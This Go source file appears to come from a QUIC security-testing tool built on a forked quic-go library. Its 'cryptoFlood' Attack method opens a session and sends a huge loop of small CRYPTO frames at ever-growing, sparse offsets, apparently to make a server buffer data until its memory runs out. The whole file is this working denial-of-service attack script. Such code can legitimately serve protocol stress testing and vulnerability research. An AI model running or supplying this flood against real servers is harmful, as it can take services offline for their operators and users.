package main

import (
	"bytes"
	"fmt"
	"time"

	"github.com/k4ra5u/quic-go/internal/protocol"
	"github.com/k4ra5u/quic-go/internal/wire"
)

type cryptoFlood struct {
	BaseArgs
}

func (cryptoFlood *cryptoFlood) Attack() (response *HTTPMessage, err error) {
	session, cancel, err := cryptoFlood.Make_one_session()
	defer func() {
		_ = session.CloseWithError(0, "")
		cancel()
	}()
	requestStream, err := session.OpenStream()
	if err != nil {
		return nil, err
	}

	crypto_bytes := bytes.Repeat([]byte("C"), 16)
	repeatTimes := cryptoFlood.repeatTimes
	for i := 0; uint64(i) < repeatTimes; i++ {
		if i%0x100000 == 0 {
			fmt.Println(i * 16)
		}
		cryptoFrame := &wire.CryptoFrame{
			Offset: protocol.ByteCount(i * 4096),
			Data:   crypto_bytes,
		}
		crypto_frame := []wire.Frame{
			cryptoFrame,
		}
		requestStream.(interface{ SendFramesDirect([]wire.Frame) }).SendFramesDirect(crypto_frame)
		time.Sleep(time.Nanosecond)
	}
	time.Sleep(time.Second * 1)
	return nil, nil

}
